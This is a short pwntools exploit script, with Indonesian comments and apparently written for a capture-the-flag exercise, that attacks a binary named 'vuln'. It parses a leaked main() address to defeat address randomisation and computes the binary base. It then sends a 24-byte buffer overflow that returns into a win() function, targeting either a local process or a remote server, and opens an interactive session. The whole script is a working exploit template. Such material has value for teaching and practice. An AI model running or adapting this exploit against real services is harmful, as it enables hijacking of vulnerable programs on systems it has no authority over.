from pwn import *

# === CONFIGURATION ===
exe = './vuln'
elf = ELF(exe)
context.binary = elf # Otomatis set arch 32/64 bit, endian, dll.

mode = 'local' # Ganti ke 'remote' untuk NC ke server

if mode == 'local':
    p = process(exe)
else:
    # Masukkan IP dan Port server target
    p = remote('10.10.10.10', 1337)

# --- LANGKAH 1: Ambil Leak Alamat ---
# Misal program print: "main: 0x555555554520"
p.recvuntil(b'main: ')
leaked_main = int(p.recvline().strip(), 16)

log.info(f"Leaked main() address: {hex(leaked_main)}")

# --- LANGKAH 2: Hitung Binary Base ---
# binary_base = Alamat Leak - Offset fungsi tersebut di binary
binary_base = leaked_main - elf.symbols['main']
elf.address = binary_base # Update base address di objek ELF agar otomatis

log.success(f"Binary Base discovered: {hex(binary_base)}")
log.success(f"win() calculated at: {hex(elf.symbols['win'])}")

# --- LANGKAH 3: Susun Payload ---
# Gunakan offset 24 byte (sesuaikan dengan hasil GDB/gambar)
offset = 24
payload = b'A' * offset

# Kita pakai pack() supaya otomatis p32 atau p64 tergantung binary-nya
payload += pack(elf.symbols['win'])

# --- LANGKAH 4: Kirim dan Eksekusi ---
log.info("Sending reliable payload...")
p.sendline(payload)

# Masuk ke mode interaktif
p.interactive()